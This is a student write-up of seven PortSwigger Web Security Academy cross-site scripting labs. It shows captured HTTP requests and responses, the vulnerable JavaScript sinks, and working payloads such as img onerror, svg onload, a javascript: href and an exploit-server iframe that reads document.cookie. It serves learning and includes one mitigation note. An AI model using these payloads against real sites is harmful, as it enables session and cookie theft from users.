
#  🕷️ PortSwigger XSS Labs — Write-up
 
**Cross-Site Scripting (Reflected, Stored, DOM-based) — PortSwigger Web Security Academy**
---
 
## Lab 1: Reflected XSS into HTML context with nothing encoded
 
`✅ Solved` · `Reflected XSS`
 
In the below request searched a random alphanumeric string which stores in a parameter name with the value. We have to do HTML injection to enable reflected XSS.
 
#### 📥 Request
```http
GET /?search=hello123 HTTP/2
Host: 0a8400c804542ae9821147ee0025001f.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8400c804542ae9821147ee0025001f.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
 
#### 💡 Exploitation
So we have to insert a html tag with our injected value, in search bar we can enter `<img src=x onerror=alert(1)>` or `<script>alert(1)</script>` which will produce an alert on the page displaying 1.
 
- In `<img src=x onerror=alert(1)>` it'll create a blank image, and `onerror` will run whether it fails or create the image.
- Next `<script>alert(1)</script>` is a JS or HTML tag where we can insert anything to create it.
---
 

## Lab 2: Stored XSS into HTML context with nothing encoded
 
`✅ Solved` · `Stored XSS`
 
Commented on a post and caught the request.
 
#### 📥 Request
```http
POST /post/comment HTTP/2
Host: 0a83008e0466d89e80e3a892000e001b.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: https://0a83008e0466d89e80e3a892000e001b.web-security-academy.net
Referer: https://0a83008e0466d89e80e3a892000e001b.web-security-academy.net/post?postId=7
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
 
csrf=8ZVfsXNLNxAM5SvnuSe0rZoi3JKmq7u8&postId=7&comment=very+useful&name=harry&email=harry%40gmail.com&website=
```
 
Then I captured the blog post request to see whether it got updated.
 
#### 📥 Request
```http
GET /post?postId=7 HTTP/2
Host: 0a83008e0466d89e80e3a892000e001b.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a83008e0466d89e80e3a892000e001b.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```
 
Got the updated requested.
 
#### 📤 Response
```http
            [...Remaining are omitted...]
                   <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            harry | 18 November 2026
                        </p>
                        <p>very useful</p>
            [...Remaining are omitted...]
```
 
#### 💡 Exploitation
Here I changed the comment to `<script>alert(1)</script>` and named another user so when the page reloads it runs the script.
 
```http
csrf=8ZVfsXNLNxAM5SvnuSe0rZoi3JKmq7u8&postId=7&comment=<script>alert(1)</script>&name=alice&email=alice%40gmail.com&website=
```
 
#### ✅ Result
And it worked after reloading the page.
 
---

## Lab 3: DOM XSS in `document.write` sink using source `location.search`
 
`✅ Solved` · `DOM-based XSS`
 
In the search bar typed a alphanumeric string and caught the request.
 
#### 📥 Request
```http
GET /?search=hello123 HTTP/2
Host: 0acb00d304dff09180a5030f00d40059.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0acb00d304dff09180a5030f00d40059.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
 
Saw a vulnerable javascript code and our search is storing inside a img file.
 
#### 📤 Response
```http
            [...Remaining are omitted...]
                   <script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
                    <img src="/resources/images/tracker.gif?searchTerms=hello123">
            [...Remaining are omitted...]
```
 
#### 💡 Exploitation
As it's storing the input in a image file variable, we can exploit it by placing `"><img src=x onerror=alert(1)>` in the search bar, where it will create a new img tag, which will create the alert.
 
<p align="center">
<img width="900" alt="alert-code" src="https://github.com/user-attachments/assets/b729df16-178d-4644-8a50-959cdd062f7f" />
</p>

---

## Lab 4: DOM XSS in `innerHTML` sink using source `location.search`
 
`✅ Solved` · `DOM-based XSS`
 
In the search bar typed a alphanumeric string and caught the request.
 
#### 📥 Request
```http
GET /?search=hello123 HTTP/2
Host: 0a2400a3041def078082533d00cf0049.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2400a3041def078082533d00cf0049.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
 
#### 📤 Response
```http
                [...Remaining are omitted...]
                       <script>
                            function doSearchQuery(query) {
                                document.getElementById('searchMessage').innerHTML = query;
                            }
                            var query = (new URLSearchParams(window.location.search)).get('search');
                            if(query) {
                                doSearchQuery(query);
                            }
                        </script>
                [...Remaining are omitted...]
```
 
#### 💡 Exploitation
Got the vulnerable portion `innerHTML`, here I tried to exploit with `<script>alert(1)</script>` but didn't work. As `<script>` elements inserted through innerHTML are parsed into the DOM but never executed. So I used `<img src=x onerror=alert(1)>` payload to exploit, this works because:
 
- `innerHTML` creates the `<img>` element and its onerror attribute.
- The browser starts loading the image from `src=x`, a relative URL that doesn't exist.
- The load fails with a 404, so the browser fires the error event.
- The `onerror` handler runs the JavaScript.
#### 🧩 Other payloads that also work
- `<svg onload=alert(1)>`
- `<body onload=alert(1)>`
#### 🛡️ Mitigation
To prevent this use `textContent` (or `innerText`) instead of `innerHTML` when we are only displaying text. The browser then treats the input as plain text, never as markup.
 
---
 
## Lab 5: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source
 
`✅ Solved` · `DOM-based XSS`
 
Clicked Submit feedback and captured the request.
 
#### 📥 Request
```http
GET /feedback?returnPath=/post HTTP/2
Host: 0a4f00bb04b434eb8128d92b00d30028.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a4f00bb04b434eb8128d92b00d30028.web-security-academy.net/post?postId=2
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
 
The vulnerable portion is `returnPath`, when some alphanumeric string is placed here it get's stored in `href` tag.
 
#### 📤 Response
```http
                        [...Remaining are omitted...]
                                        <div class="is-linkback">
                                            <a id="backLink">Back</a>
                                        </div>
                                        <script>
                                            $(function() {
                                                $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
                                            });
                                        </script>
                        [...Remaining are omitted...]
```
 
<p align="center">
<img width="900" alt="lab-5" src="https://github.com/user-attachments/assets/2de04b34-972b-4cb5-8028-e881212d57df" />
</p>  

#### 💡 Exploitation
So `href` accepts `javascript:alert(document.cookie)`, when this payload is placed in `returnPath`, hit enter, then we've to click `Back` to execute our payload, previous labs ran automatically as no JS payload was needed.
 
---

## Lab 6: DOM XSS in jQuery selector sink using a `hashchange` event
 
`✅ Solved` · `DOM-based XSS`
 
Captured request of home page, and a vulnerable portion found.
 
- `window.location.hash.slice(1)` – retrieves the URL fragment after #.
- `decodeURIComponent()` – decodes URL-encoded characters.
- `:contains()` – inserts the decoded input into a jQuery selector.
- `$()` – interprets the resulting string as a selector.
- jQuery's `$()` function doesn't just run CSS selectors — if the string it's given looks like it contains an HTML tag, jQuery's internal `isHTML` check kicks in and it creates and injects that HTML into the DOM instead of just selecting something. So by putting a tag like `<img>` into the hash, we can get jQuery to build and insert an actual DOM element, and from there, an onerror handler fires just like with `innerHTML`-based XSS.
```http
               [...Remaining are omitted...]
                   <script>
                        $(window).on('hashchange', function(){
                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                            if (post) post.get(0).scrollIntoView();
                        });
                    </script>
               [...Remaining are omitted...]
```
 
#### 💡 Exploitation
Click `Go to exploit server`. In Body add this:
 
```html
<iframe src="https://your-lab-id.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=alert(document.cookie)>'"</iframe>
```
 
Then click `Store`, and then `View exploit`.
 
<p align="center">
<img width="900" alt="lab-6-pic" src="https://github.com/user-attachments/assets/62c8608e-e01c-4ffb-963c-4483541d5655" />
</p>

#### ✅ Result
This will make a new image source with our lab id, and it will show our home page of lab. Now click `Deliver exploit to victim` to solve lab.
 
---

## Lab 7: Reflected XSS into attribute with angle brackets HTML-encoded
 
`✅ Solved` · `Reflected XSS`
 
After sending found a vulnerability of `value`.
 
#### 📥 Request
```http
GET /?search=hello123 HTTP/2
Host: 0a0500a703762633813f202b00fa00a5.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0500a703762633813f202b00fa00a5.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
 
Our search is going into a variable `value`.

#### 📤 Response
```http
                [...Remaining are omitted...]
                   <section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search value="hello123">
                [...Remaining are omitted...]
```
 
#### 💡 Exploitation
Now we need to send a payload to another variable so that it works, I tested by searching `"hello123`, saw the response stores by ending the `value`, started a new variable with a `=`. So if I try to block the whole line with `>` and run `<script>alert(1)</script>`, it'll not work as it will not be valid HTML form containing no value and variable in `=` and it's getting URL encoded after sending request.
 
```http
<input type="text" placeholder="Search the blog..." name="search" value="" hello123"="">
```
 
Now I tested with input `"hello="123`, now it's a valid HTML form. Now I have to give a payload which contains value defining parameter.
 
```http
<input type="text" placeholder="Search the blog..." name="search" value="" hello="123">
```
 
Ran this payload, `"onclick="alert(1)`, when clicking the searchbox, it's executing and giving alert.
 
 
